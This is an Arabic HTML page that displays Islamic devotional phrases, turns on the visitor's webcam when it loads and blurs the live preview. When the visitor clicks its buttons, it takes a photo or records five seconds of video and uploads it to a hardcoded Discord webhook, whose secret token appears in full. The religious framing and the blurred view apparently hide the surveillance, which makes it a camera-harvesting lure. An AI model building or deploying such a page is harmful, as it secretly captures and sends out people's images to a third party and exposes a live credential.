<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>التقاط صورة وفيديو</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            background-color: #f0f8ff;
            padding-top: 50px;
        }
        h1 {
            color: #333;
        }
        video {
            width: 80%;
            max-width: 600px;
            border: 1px solid #ddd;
            margin-bottom: 20px;
            filter: blur(10px); /* إضافة فلتر تشويش على الفيديو */
        }
        canvas {
            display: none;
        }
        button {
            padding: 10px 20px;
            background-color: #007BFF;
            color: white;
            border: none;
            font-size: 16px;
            cursor: pointer;
        }
        button:hover {
            background-color: #0056b3;
        }
        .message {
            margin-top: 20px;
            font-size: 18px;
        }
        .prayer {
            font-size: 22px;
            color: #0000cd;
            font-weight: bold;
        }
    </style>
</head>
<body>

    <h1>التقاط صورة وفيديو عند الطلب</h1>
    
    <!-- عرض الذكرى بشكل تلقائي -->
    <div>
        <p class="prayer">بسم الله الرحمن الرحيم</p>
        <p class="prayer">اللهم صل وسلم على سيدنا محمد</p>
        <p class="prayer">سبحان الله وبحمده، سبحان الله العظيم</p>
        <p class="prayer">لا إله إلا الله محمد رسول الله</p>
        <p class="prayer">اللهم اجعلنا من الذاكرين والذاكرات</p>
    </div>

    <video id="video" autoplay></video>
    <br>
    <p class="message" id="message"></p>

    <canvas id="canvas" width="640" height="480"></canvas>

    <button id="captureButton">التقاط صورة</button>
    <button id="recordButton">بدء تسجيل الفيديو</button>
    
    <script>
        const video = document.getElementById('video');
        const message = document.getElementById('message');
        const canvas = document.getElementById('canvas');
        const ctx = canvas.getContext('2d');
        let stream;
        let recorder;
        let chunks = [];

        // بدء تشغيل الفيديو من كاميرا الويب عند تحميل الصفحة
        async function startVideo() {
            try {
                stream = await navigator.mediaDevices.getUserMedia({ video: true });
                video.srcObject = stream;
            } catch (err) {
                message.textContent = "لم يتمكن المتصفح من الوصول إلى الكاميرا.";
                console.error("خطأ في الوصول إلى الكاميرا: ", err);
            }
        }

        // التقاط صورة عند الضغط على زر "التقاط صورة"
        document.getElementById('captureButton').addEventListener('click', captureImage);

        function captureImage() {
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            const imageData = canvas.toDataURL('image/png');
            sendImageToWebhook(imageData);
        }

        // بدء تسجيل الفيديو عند الضغط على زر "بدء تسجيل الفيديو"
        document.getElementById('recordButton').addEventListener('click', startRecording);

        function startRecording() {
            chunks = [];
            recorder = new MediaRecorder(stream);
            recorder.ondataavailable = (e) => chunks.push(e.data);
            recorder.onstop = () => sendVideoToWebhook();
            recorder.start();
            message.textContent = "يتم تسجيل الفيديو...";

            // التوقف عن التسجيل بعد 5 ثواني
            setTimeout(() => {
                recorder.stop();
            }, 5000);
        }

        // إرسال الصورة إلى الـ Webhook
        async function sendImageToWebhook(imageData) {
            try {
                const response = await fetch('https://discord.com/api/webhooks/1362295538137043034/kVkadWuQygKz3igA3HVip8gs6ZA5met8p1SBlfszjSEQ_y1M58cvofS7U-C23Mv3Tzao', { // Webhook الخاص بك
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({ image: imageData })
                });

                if (response.ok) {
                    message.textContent = "تم إرسال الصورة بنجاح!";
                } else {
                    message.textContent = "حدث خطأ أثناء إرسال الصورة.";
                }
            } catch (err) {
                message.textContent = "حدث خطأ أثناء الاتصال بالـ Webhook.";
                console.error("Error sending image:", err);
            }
        }

        // إرسال الفيديو إلى الـ Webhook
        async function sendVideoToWebhook() {
            const blob = new Blob(chunks, { type: 'video/webm' });
            const formData = new FormData();
            formData.append('video', blob, 'video.webm');

            try {
                const response = await fetch('https://discord.com/api/webhooks/1362295538137043034/kVkadWuQygKz3igA3HVip8gs6ZA5met8p1SBlfszjSEQ_y1M58cvofS7U-C23Mv3Tzao', { // Webhook الخاص بك
                    method: 'POST',
                    body: formData
                });

                if (response.ok) {
                    message.textContent = "تم إرسال الفيديو بنجاح!";
                } else {
                    message.textContent = "حدث خطأ أثناء إرسال الفيديو.";
                }
            } catch (err) {
                message.textContent = "حدث خطأ أثناء الاتصال بالـ Webhook.";
                console.error("Error sending video:", err);
            }
        }

        // بدء تشغيل الفيديو عند تحميل الصفحة
        window.onload = startVideo;
    </script>

</body>
</html>
